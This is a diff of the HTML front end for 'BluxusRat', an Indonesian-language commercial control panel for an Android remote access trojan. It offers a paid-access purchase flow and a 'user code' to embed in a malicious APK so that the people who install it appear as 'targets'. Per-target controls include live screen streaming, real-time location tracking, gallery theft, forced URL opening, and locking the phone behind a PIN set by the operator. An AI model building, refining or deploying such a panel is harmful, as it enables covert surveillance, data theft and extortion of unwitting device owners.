@@ -12,16 +12,12 @@
 </head>
 <body>
 
-<!-- CONNECTION DOT -->
 <div id="conn-dot"></div>
 
-<!-- APP -->
 <div id="app">
   <div class="app-shell">
 
-    <!-- ============================================================
-         LOADING
-         ============================================================ -->
+    <!-- LOADING -->
     <div class="screen active" id="screen-loading">
       <div class="brand-logo">BluxusRat</div>
       <div class="brand-sub">V1 [NewEra]</div>
@@ -30,9 +26,7 @@
       <div id="loading-text">Connecting to Firebase...</div>
     </div>
 
-    <!-- ============================================================
-         LOGIN
-         ============================================================ -->
+    <!-- LOGIN -->
     <div class="screen" id="screen-login">
       <div class="banner-wrap">
         <img src="assets/banner-login.png" onerror="this.style.display='none'">
@@ -70,9 +64,7 @@
       </div>
     </div>
 
-    <!-- ============================================================
-         BELI AKSES (Multi-step)
-         ============================================================ -->
+    <!-- BELI AKSES -->
     <div class="screen" id="screen-buy">
       <div class="dash-header">
         <div class="hamburger" id="btn-back-buy"><i class="fa-solid fa-arrow-left"></i></div>
@@ -80,42 +72,22 @@
         <div style="width:40px"></div>
       </div>
       <div class="dash-body">
-        
-        <!-- STEPPER -->
         <div class="stepper" id="buy-stepper">
-          <div class="step active" data-step="1">
-            <div class="step-num">1</div>
-            <div class="step-label">Role</div>
-          </div>
+          <div class="step active" data-step="1"><div class="step-num">1</div><div class="step-label">Role</div></div>
           <div class="step-line"></div>
-          <div class="step" data-step="2">
-            <div class="step-num">2</div>
-            <div class="step-label">Durasi</div>
-          </div>
+          <div class="step" data-step="2"><div class="step-num">2</div><div class="step-label">Durasi</div></div>
           <div class="step-line"></div>
-          <div class="step" data-step="3">
-            <div class="step-num">3</div>
-            <div class="step-label">Data</div>
-          </div>
+          <div class="step" data-step="3"><div class="step-num">3</div><div class="step-label">Data</div></div>
           <div class="step-line"></div>
-          <div class="step" data-step="4">
-            <div class="step-num">4</div>
-            <div class="step-label">Bayar</div>
-          </div>
+          <div class="step" data-step="4"><div class="step-num">4</div><div class="step-label">Bayar</div></div>
         </div>
-
-        <!-- STEP 1: PILIH ROLE -->
         <div class="buy-step active" id="buy-step-1">
           <div class="section">
             <h3><div class="ico-badge"><i class="fa-solid fa-user-tag"></i></div> Pilih Role</h3>
             <div class="role-grid" id="buy-role-grid"></div>
           </div>
-          <button class="btn btn-primary" id="btn-buy-next-1" disabled>
-            Lanjut <i class="fa-solid fa-arrow-right"></i>
-          </button>
+          <button class="btn btn-primary" id="btn-buy-next-1" disabled>Lanjut <i class="fa-solid fa-arrow-right"></i></button>
         </div>
-
-        <!-- STEP 2: PILIH DURASI -->
         <div class="buy-step" id="buy-step-2">
           <div class="section">
             <h3><div class="ico-badge"><i class="fa-solid fa-clock"></i></div> Pilih Durasi</h3>
@@ -127,26 +99,18 @@
             <button class="btn btn-primary" id="btn-buy-next-2" disabled>Lanjut <i class="fa-solid fa-arrow-right"></i></button>
           </div>
         </div>
-
-        <!-- STEP 3: DATA -->
         <div class="buy-step" id="buy-step-3">
           <div class="section">
             <h3><div class="ico-badge"><i class="fa-solid fa-pen"></i></div> Data Akun</h3>
             <div class="field">
               <label>Username yang mau dibeli/dibuat</label>
-              <div class="input-wrap">
-                <div class="ico-badge"><i class="fa-solid fa-user"></i></div>
-                <input type="text" id="buy-username" placeholder="username">
-              </div>
+              <div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-user"></i></div><input type="text" id="buy-username" placeholder="username"></div>
             </div>
             <div class="field">
               <label>Email Anda</label>
-              <div class="input-wrap">
-                <div class="ico-badge"><i class="fa-solid fa-envelope"></i></div>
-                <input type="email" id="buy-email" placeholder="email@example.com">
-              </div>
+              <div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-envelope"></i></div><input type="email" id="buy-email" placeholder="email@example.com"></div>
             </div>
-            <div class="buy-note" id="buy-note">
+            <div class="buy-note">
               <i class="fa-solid fa-circle-info"></i>
               <span>Data akun akan dikirim ke email Anda setelah pembayaran diverifikasi. Pastikan email aktif & benar.</span>
             </div>
@@ -156,8 +120,6 @@
             <button class="btn btn-primary" id="btn-buy-next-3" disabled>Ya, Kirim <i class="fa-solid fa-paper-plane"></i></button>
           </div>
         </div>
-
-        <!-- STEP 4: BAYAR -->
         <div class="buy-step" id="buy-step-4">
           <div class="section">
             <h3><div class="ico-badge"><i class="fa-solid fa-circle-check"></i></div> Pesanan Terkirim</h3>
@@ -168,23 +130,16 @@
             <div class="order-detail" id="order-detail"></div>
             <div class="buy-note" style="margin-top:14px">
               <i class="fa-solid fa-triangle-exclamation" style="color:var(--warning)"></i>
-              <span>Kirim struk belanja ke WhatsApp admin untuk verifikasi pesanan. Pesanan diproses setelah pembayaran diverifikasi.</span>
+              <span>Kirim struk belanja ke WhatsApp admin untuk verifikasi pesanan.</span>
             </div>
           </div>
-          <button class="btn btn-primary" id="btn-buy-pay">
-            <i class="fa-brands fa-whatsapp"></i> Bayar & Kirim Struk
-          </button>
-          <button class="btn btn-ghost" id="btn-buy-done" style="margin-top:10px">
-            Selesai
-          </button>
+          <button class="btn btn-primary" id="btn-buy-pay"><i class="fa-brands fa-whatsapp"></i> Bayar & Kirim Struk</button>
+          <button class="btn btn-ghost" id="btn-buy-done" style="margin-top:10px">Selesai</button>
         </div>
-
       </div>
     </div>
 
-    <!-- ============================================================
-         DASHBOARD
-         ============================================================ -->
+    <!-- DASHBOARD -->
     <div class="screen" id="screen-dash">
       <div class="dash-header">
         <div class="hamburger" id="btn-hamburger"><i class="fa-solid fa-bars"></i></div>
@@ -227,9 +182,7 @@
       </div>
     </div>
 
-    <!-- ============================================================
-         RAT
-         ============================================================ -->
+    <!-- RAT -->
     <div class="screen" id="screen-rat">
       <div class="dash-header">
         <div class="hamburger" id="btn-hamburger-rat"><i class="fa-solid fa-bars"></i></div>
@@ -240,33 +193,22 @@
         <div class="usercode-card fade-in">
           <div class="uc-head">
             <div class="ico-badge"><i class="fa-solid fa-key"></i></div>
-            <div>
-              <div class="t">User Code Kamu</div>
-              <div class="d">Taruh di config.json APK</div>
-            </div>
+            <div><div class="t">User Code Kamu</div><div class="d">Taruh di config.json APK</div></div>
           </div>
           <div class="uc-row">
             <div class="uc-code" id="rat-usercode">—</div>
             <button class="uc-copy ripple" id="btn-copy-usercode"><i class="fa-solid fa-copy"></i></button>
           </div>
-          <div class="uc-info">
-            <i class="fa-solid fa-circle-info"></i>
-            <span>Code ini buat identifikasi target yang install APK kamu.</span>
-          </div>
+          <div class="uc-info"><i class="fa-solid fa-circle-info"></i><span>Code ini buat identifikasi target yang install APK kamu.</span></div>
         </div>
         <div class="section fade-in-1">
           <h3><div class="ico-badge"><i class="fa-solid fa-satellite-dish"></i></div> Target List</h3>
-          <div class="target-list" id="target-list">
-            <div class="skeleton"></div>
-            <div class="skeleton"></div>
-          </div>
+          <div class="target-list" id="target-list"><div class="skeleton"></div><div class="skeleton"></div></div>
         </div>
       </div>
     </div>
 
-    <!-- ============================================================
-         TARGET DETAIL (Full halaman control)
-         ============================================================ -->
+    <!-- TARGET DETAIL -->
     <div class="screen" id="screen-target">
       <div class="dash-header">
         <div class="hamburger" id="btn-target-back"><i class="fa-solid fa-arrow-left"></i></div>
@@ -274,45 +216,23 @@
         <div style="width:40px"></div>
       </div>
       <div class="dash-body">
-        
-        <!-- GRID CARD FITUR -->
-        <div class="feature-grid" id="feature-grid">
-          <!-- Di-generate JS -->
-        </div>
+        <div class="feature-grid" id="feature-grid"></div>
 
-        <!-- SUB-PAGE: INFO -->
         <div class="feature-page" id="fp-info">
-          <div class="fp-header">
-            <div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div>
-            <div class="fp-title">Info Device</div>
-          </div>
-          <div class="fp-desc">
-            Detail lengkap device target. Semua data terupdate otomatis saat target online.
-          </div>
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Info Device</div></div>
+          <div class="fp-desc">Detail lengkap device target. Semua data terupdate otomatis saat target online.</div>
           <div class="section" id="info-content"></div>
         </div>
 
-        <!-- SUB-PAGE: LIVE CAM -->
         <div class="feature-page" id="fp-live">
-          <div class="fp-header">
-            <div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div>
-            <div class="fp-title">Live Cam</div>
-          </div>
-          <div class="fp-desc">
-            Stream layar target secara real-time. Cuma work di Android 11+ (SDK 30+). Kalo target pake Android di bawah 11, fitur ini gak bisa dipake.
-          </div>
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Live Cam</div></div>
+          <div class="fp-desc">Stream layar target secara real-time. Cuma work di Android 11+ (SDK 30+).</div>
           <div class="toggle-row" id="live-toggle-row">
             <div class="tr-left">
               <div class="ico-badge"><i class="fa-solid fa-video"></i></div>
-              <div class="tr-info">
-                <div class="n">Aktifkan Live Cam</div>
-                <div class="d">Stream layar target</div>
-              </div>
+              <div class="tr-info"><div class="n">Aktifkan Live Cam</div><div class="d">Stream layar target</div></div>
             </div>
-            <label class="switch">
-              <input type="checkbox" id="sw-live">
-              <span class="slider"></span>
-            </label>
+            <label class="switch"><input type="checkbox" id="sw-live"><span class="slider"></span></label>
           </div>
           <div class="live-warning hidden" id="live-warning">
             <i class="fa-solid fa-triangle-exclamation"></i>
@@ -323,27 +243,15 @@
           </div>
         </div>
 
-        <!-- SUB-PAGE: LOCATE -->
         <div class="feature-page" id="fp-locate">
-          <div class="fp-header">
-            <div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div>
-            <div class="fp-title">Locate</div>
-          </div>
-          <div class="fp-desc">
-            Ambil lokasi target secara real-time. Target harus ngasih izin lokasi pas install APK.
-          </div>
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Locate</div></div>
+          <div class="fp-desc">Ambil lokasi target secara real-time.</div>
           <div class="toggle-row">
             <div class="tr-left">
               <div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div>
-              <div class="tr-info">
-                <div class="n">Aktifkan Locate</div>
-                <div class="d">Lokasi target</div>
-              </div>
+              <div class="tr-info"><div class="n">Aktifkan Locate</div><div class="d">Lokasi target</div></div>
             </div>
-            <label class="switch">
-              <input type="checkbox" id="sw-loc">
-              <span class="slider"></span>
-            </label>
+            <label class="switch"><input type="checkbox" id="sw-loc"><span class="slider"></span></label>
           </div>
           <div class="loc-map" id="loc-map" style="margin-top:14px">
             <div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>
@@ -351,67 +259,37 @@
           <div class="loc-coords" id="loc-coords">—</div>
         </div>
 
-        <!-- SUB-PAGE: SENTER + STROBO -->
         <div class="feature-page" id="fp-flash">
-          <div class="fp-header">
-            <div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div>
-            <div class="fp-title">Senter & Strobo</div>
-          </div>
-          <div class="fp-desc">
-            Kontrol senter (flashlight) target. Strobo bakal bikin senter kedip tiap 1 detik.
-          </div>
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Senter & Strobo</div></div>
+          <div class="fp-desc">Kontrol senter (flashlight) target. Strobo bakal bikin senter kedip tiap 1 detik.</div>
           <div class="toggle-row">
-            <div class="tr-left">
-              <div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div>
-              <div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div>
-            </div>
+            <div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-flashlight"></i></div><div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div></div>
             <label class="switch"><input type="checkbox" id="sw-flash"><span class="slider"></span></label>
           </div>
           <div class="toggle-row">
-            <div class="tr-left">
-              <div class="ico-badge"><i class="fa-solid fa-bolt"></i></div>
-              <div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip tiap 1 detik</div></div>
-            </div>
+            <div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-bolt"></i></div><div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip tiap 1 detik</div></div></div>
             <label class="switch"><input type="checkbox" id="sw-strobo"><span class="slider"></span></label>
           </div>
         </div>
 
-        <!-- SUB-PAGE: KUNCI HP -->
         <div class="feature-page" id="fp-lock">
-          <div class="fp-header">
-            <div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div>
-            <div class="fp-title">Kunci HP</div>
-          </div>
-          <div class="fp-desc">
-            Kunci HP target pake overlay. Target harus masukin PIN 4-digit yang lo set. Kalo salah, HP tetep ke-lock.
-          </div>
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Kunci HP</div></div>
+          <div class="fp-desc">Kunci HP target pake overlay. Target harus masukin PIN 4-digit yang lo set.</div>
           <div class="section">
             <div class="field">
               <label>PIN 4 Digit</label>
-              <div class="input-wrap">
-                <div class="ico-badge"><i class="fa-solid fa-lock"></i></div>
-                <input type="tel" id="lock-pin" maxlength="4" placeholder="0000">
-              </div>
+              <div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="tel" id="lock-pin" maxlength="4" placeholder="0000"></div>
             </div>
             <div class="toggle-row">
-              <div class="tr-left">
-                <div class="ico-badge"><i class="fa-solid fa-mobile-screen-button"></i></div>
-                <div class="tr-info"><div class="n">Status Lock</div><div class="d">Aktifin buat kunci HP target</div></div>
-              </div>
+              <div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-mobile-screen-button"></i></div><div class="tr-info"><div class="n">Status Lock</div><div class="d">Aktifin buat kunci HP target</div></div></div>
               <label class="switch"><input type="checkbox" id="sw-lock"><span class="slider"></span></label>
             </div>
           </div>
         </div>
 
-        <!-- SUB-PAGE: VOLUME -->
         <div class="feature-page" id="fp-volume">
-          <div class="fp-header">
-            <div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div>
-            <div class="fp-title">Set Volume</div>
-          </div>
-          <div class="fp-desc">
-            Atur volume HP target. Geser slider buat naikin/turunin volume. Perubahan bakal langsung diterapin ke HP target.
-          </div>
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Set Volume</div></div>
+          <div class="fp-desc">Atur volume HP target. Geser slider buat naikin/turunin volume.</div>
           <div class="section">
             <div class="slider-row">
               <div class="slider-icon"><i class="fa-solid fa-volume-low"></i></div>
@@ -419,21 +297,13 @@
               <div class="slider-icon"><i class="fa-solid fa-volume-high"></i></div>
             </div>
             <div class="slider-value" id="volume-value">50%</div>
-            <button class="btn btn-primary" id="btn-set-volume" style="margin-top:14px">
-              <i class="fa-solid fa-check"></i> Terapkan Volume
-            </button>
+            <button class="btn btn-primary" id="btn-set-volume" style="margin-top:14px"><i class="fa-solid fa-check"></i> Terapkan Volume</button>
           </div>
         </div>
 
-        <!-- SUB-PAGE: KECERAHAN -->
         <div class="feature-page" id="fp-brightness">
-          <div class="fp-header">
-            <div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div>
-            <div class="fp-title">Set Kecerahan</div>
-          </div>
-          <div class="fp-desc">
-            Atur tingkat kecerahan layar HP target. Slider kiri = redup, kanan = terang.
-          </div>
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Set Kecerahan</div></div>
+          <div class="fp-desc">Atur tingkat kecerahan layar HP target.</div>
           <div class="section">
             <div class="slider-row">
               <div class="slider-icon"><i class="fa-solid fa-sun"></i></div>
@@ -441,63 +311,36 @@
               <div class="slider-icon"><i class="fa-solid fa-sun" style="font-size:20px"></i></div>
             </div>
             <div class="slider-value" id="brightness-value">50%</div>
-            <button class="btn btn-primary" id="btn-set-brightness" style="margin-top:14px">
-              <i class="fa-solid fa-check"></i> Terapkan Kecerahan
-            </button>
+            <button class="btn btn-primary" id="btn-set-brightness" style="margin-top:14px"><i class="fa-solid fa-check"></i> Terapkan Kecerahan</button>
           </div>
         </div>
 
-        <!-- SUB-PAGE: URL DIRECT -->
         <div class="feature-page" id="fp-url">
-          <div class="fp-header">
-            <div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div>
-            <div class="fp-title">URL Direct</div>
-          </div>
-          <div class="fp-desc">
-            Buka URL di browser HP target secara otomatis. Tinggal masukin link, HP target bakal langsung buka browser ke link itu.
-          </div>
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">URL Direct</div></div>
+          <div class="fp-desc">Buka URL di browser HP target secara otomatis.</div>
           <div class="section">
             <div class="field">
               <label>URL Target</label>
-              <div class="input-wrap">
-                <div class="ico-badge"><i class="fa-solid fa-link"></i></div>
-                <input type="url" id="url-direct" placeholder="https://example.com">
-              </div>
+              <div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-link"></i></div><input type="url" id="url-direct" placeholder="https://example.com"></div>
             </div>
-            <button class="btn btn-primary" id="btn-open-url" style="margin-top:8px">
-              <i class="fa-solid fa-arrow-up-right-from-square"></i> Buka URL di Target
-            </button>
+            <button class="btn btn-primary" id="btn-open-url" style="margin-top:8px"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka URL di Target</button>
           </div>
         </div>
 
-        <!-- SUB-PAGE: GALLERY -->
         <div class="feature-page" id="fp-gallery">
-          <div class="fp-header">
-            <div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div>
-            <div class="fp-title">Get Gallery</div>
-          </div>
-          <div class="fp-desc">
-            Ambil semua foto dari galeri HP target. Foto bakal di-load ke sini. Butuh izin storage di HP target.
-          </div>
+          <div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Get Gallery</div></div>
+          <div class="fp-desc">Ambil semua foto dari galeri HP target.</div>
           <div class="section">
-            <button class="btn btn-primary" id="btn-get-gallery">
-              <i class="fa-solid fa-images"></i> Ambil Galeri
-            </button>
+            <button class="btn btn-primary" id="btn-get-gallery"><i class="fa-solid fa-images"></i> Ambil Galeri</button>
             <div class="gallery-grid" id="gallery-grid" style="margin-top:14px">
-              <div class="empty" style="grid-column:1/-1">
-                <i class="fa-solid fa-image"></i>
-                <div>Klik tombol buat ambil galeri target</div>
-              </div>
+              <div class="empty" style="grid-column:1/-1"><i class="fa-solid fa-image"></i><div>Klik tombol buat ambil galeri target</div></div>
             </div>
           </div>
         </div>
-
       </div>
     </div>
 
-    <!-- ============================================================
-         BLUXANIME
-         ============================================================ -->
+    <!-- BLUXANIME -->
     <div class="screen" id="screen-anime">
       <div class="anime-header">
         <div class="anime-header-top">
@@ -513,22 +356,16 @@
         </div>
       </div>
       <div class="anime-body" id="anime-body">
-        <div class="anime-banner">
-          <img id="anime-banner-img" src="" onerror="this.style.opacity='0'">
-        </div>
+        <div class="anime-banner"><img id="anime-banner-img" src="" onerror="this.style.opacity='0'"></div>
         <div class="anime-title-block">
           <div class="t">BLUXANIME</div>
           <div class="s">Nonton anime subtitle Indonesia gratis</div>
         </div>
-        <div class="anime-rows" id="anime-rows">
-          <div class="anime-loading"><div class="sp"></div><span>Loading...</span></div>
-        </div>
+        <div class="anime-rows" id="anime-rows"><div class="anime-loading"><div class="sp"></div><span>Loading...</span></div></div>
       </div>
     </div>
 
-    <!-- ============================================================
-         TOOLS
-         ============================================================ -->
+    <!-- TOOLS -->
     <div class="screen" id="screen-tools">
       <div class="dash-header">
         <div class="hamburger" id="btn-hamburger-tools"><i class="fa-solid fa-bars"></i></div>
@@ -543,19 +380,14 @@
         <div class="vip-section fade-in-1">
           <div class="vip-header">
             <div class="vh-icon"><i class="fa-solid fa-crown"></i></div>
-            <div class="vh-text">
-              <div class="n">VIP Tools</div>
-              <div class="d">Khusus VIP, Reseller & Owner</div>
-            </div>
+            <div class="vh-text"><div class="n">VIP Tools</div><div class="d">Khusus VIP, Reseller & Owner</div></div>
           </div>
           <div class="tools-grid" id="vip-tools-grid"></div>
         </div>
       </div>
     </div>
 
-    <!-- ============================================================
-         BENEFIT ROLE
-         ============================================================ -->
+    <!-- BENEFIT -->
     <div class="screen" id="screen-benefit">
       <div class="dash-header">
         <div class="hamburger" id="btn-hamburger-benefit"><i class="fa-solid fa-bars"></i></div>
@@ -566,25 +398,18 @@
         <div class="benefit-hero fade-in">
           <div class="bh-icon"><i class="fa-solid fa-medal"></i></div>
           <div class="bh-title">Benefit Role</div>
-          <div class="bh-desc">Kenali role di BluxusRat & benefitnya. Pilih role yang sesuai kebutuhanmu.</div>
+          <div class="bh-desc">Kenali role di BluxusRat & benefitnya.</div>
         </div>
-
         <div id="role-cards" class="fade-in-1"></div>
-
         <div class="section fade-in-2">
           <h3><div class="ico-badge"><i class="fa-solid fa-question"></i></div> FAQ</h3>
           <div id="faq-list"></div>
         </div>
-
-        <button class="btn btn-primary fade-in-3" id="btn-upgrade-role">
-          <i class="fa-solid fa-arrow-up"></i> Upgrade Role
-        </button>
+        <button class="btn btn-primary fade-in-3" id="btn-upgrade-role"><i class="fa-solid fa-arrow-up"></i> Upgrade Role</button>
       </div>
     </div>
 
-    <!-- ============================================================
-         ACCOUNT
-         ============================================================ -->
+    <!-- ACCOUNT -->
     <div class="screen" id="screen-account">
       <div class="dash-header">
         <div class="hamburger" id="btn-hamburger-account"><i class="fa-solid fa-bars"></i></div>
@@ -601,15 +426,9 @@
           <div class="urole" id="acc-role">member</div>
         </div>
         <div class="section fade-in-1">
-          <div class="info-row">
-            <span class="lbl"><i class="fa-solid fa-key"></i> User Code</span>
-            <span class="val mono" id="acc-usercode">—</span>
-          </div>
+          <div class="info-row"><span class="lbl"><i class="fa-solid fa-key"></i> User Code</span><span class="val mono" id="acc-usercode">—</span></div>
           <div class="info-sep"></div>
-          <div class="info-row">
-            <span class="lbl"><i class="fa-solid fa-calendar"></i> Created</span>
-            <span class="val" id="acc-created">—</span>
-          </div>
+          <div class="info-row"><span class="lbl"><i class="fa-solid fa-calendar"></i> Created</span><span class="val" id="acc-created">—</span></div>
         </div>
         <div class="list-item fade-in-2" id="btn-settings">
           <div class="ico-badge"><i class="fa-solid fa-gear"></i></div>
@@ -624,9 +443,7 @@
       </div>
     </div>
 
-    <!-- ============================================================
-         ABOUT
-         ============================================================ -->
+    <!-- ABOUT -->
     <div class="screen" id="screen-about">
       <div class="dash-header">
         <div class="hamburger" id="btn-hamburger-about"><i class="fa-solid fa-bars"></i></div>
@@ -670,9 +487,7 @@
       </div>
     </div>
 
-    <!-- ============================================================
-         PANEL
-         ============================================================ -->
+    <!-- PANEL -->
     <div class="screen" id="screen-panel">
       <div class="dash-header">
         <div class="hamburger" id="btn-hamburger-panel"><i class="fa-solid fa-bars"></i></div>
@@ -688,9 +503,7 @@
       </div>
     </div>
 
-    <!-- ============================================================
-         EKONOMI (Dev only)
-         ============================================================ -->
+    <!-- EKONOMI -->
     <div class="screen" id="screen-ekonomi">
       <div class="dash-header">
         <div class="hamburger" id="btn-ekonomi-back"><i class="fa-solid fa-arrow-left"></i></div>
@@ -710,9 +523,7 @@
       </div>
     </div>
 
-    <!-- ============================================================
-         MANAGE ORDER (Dev only)
-         ============================================================ -->
+    <!-- MANAGE ORDER -->
     <div class="screen" id="screen-order">
       <div class="dash-header">
         <div class="hamburger" id="btn-order-back"><i class="fa-solid fa-arrow-left"></i></div>
@@ -727,16 +538,10 @@
         </div>
         <div class="section">
           <div class="field">
-            <div class="input-wrap">
-              <div class="ico-badge"><i class="fa-solid fa-search"></i></div>
-              <input type="text" id="order-search" placeholder="Cari Order ID...">
-            </div>
+            <div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-search"></i></div><input type="text" id="order-search" placeholder="Cari Order ID..."></div>
           </div>
         </div>
-        <div class="order-list" id="order-list">
-          <div class="skeleton"></div>
-          <div class="skeleton"></div>
-        </div>
+        <div class="order-list" id="order-list"><div class="skeleton"></div><div class="skeleton"></div></div>
       </div>
     </div>
 
@@ -795,7 +600,7 @@
 <div id="toast-wrap"></div>
 
 <!-- SCRIPT -->
-<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="https://smtpjs.com/v3/smtp.js" onerror="console.error('SMTPJS gagal load')"></script>
 <script type="module" src="script.js"></script>
 
 </body>
